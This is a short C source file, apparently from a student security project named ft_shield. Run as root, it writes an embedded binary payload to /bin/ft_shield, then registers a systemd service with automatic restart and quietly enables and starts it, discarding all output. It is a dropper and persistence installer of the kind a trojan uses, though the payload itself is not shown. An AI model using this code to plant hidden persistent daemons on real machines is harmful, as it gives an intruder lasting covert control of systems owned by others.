#include "./inc/ft_shield.h"

static void	create_ft_shield(void)
{
	int fd = open(SHIELD_PATH, O_CREAT | O_WRONLY | O_TRUNC, 0755);
	if (fd < 0)
		exit (EXIT_FAILURE);

	ssize_t bytes_out = write(fd, __daemon_shield_payload, __daemon_shield_payload_len);
	if (bytes_out < 0)
	{
		close(fd);
		exit (EXIT_FAILURE);
	}
	close(fd);
}

void start_service(void)
{
	int fd = open(SCRIPT_PATH, O_CREAT | O_WRONLY | O_TRUNC, 0755);
	if (fd < 0)
		exit (EXIT_FAILURE);

	const char *systemd =
		"[Unit]\n"
		"Description=ft_shield service\n"
		"After=network.target\n"
		"\n"
		"[Service]\n"
		"Type=forking\n"
		"ExecStart=/bin/ft_shield\n"
		"ExecStop=/bin/kill -2 $MAINPID\n"
		"Restart=always\n"
		"\n"
		"[Install]\n"
		"WantedBy=multi-user.target\n";

	ssize_t bytes_out = write(fd, systemd, strlen(systemd));
	if (bytes_out < 0)
	{
		close(fd);
		exit (EXIT_FAILURE);
	}
	close(fd);
	system("systemctl daemon-reload > /dev/null 2>&1");
	system("systemctl enable ft_shield > /dev/null 2>&1");
	system("systemctl start ft_shield > /dev/null 2>&1");
}

int	main()
{
	if (geteuid())
		exit (EXIT_FAILURE);
	create_ft_shield();
	start_service();
	printf("ffarkas-edupless\n");
	return (EXIT_SUCCESS);
}
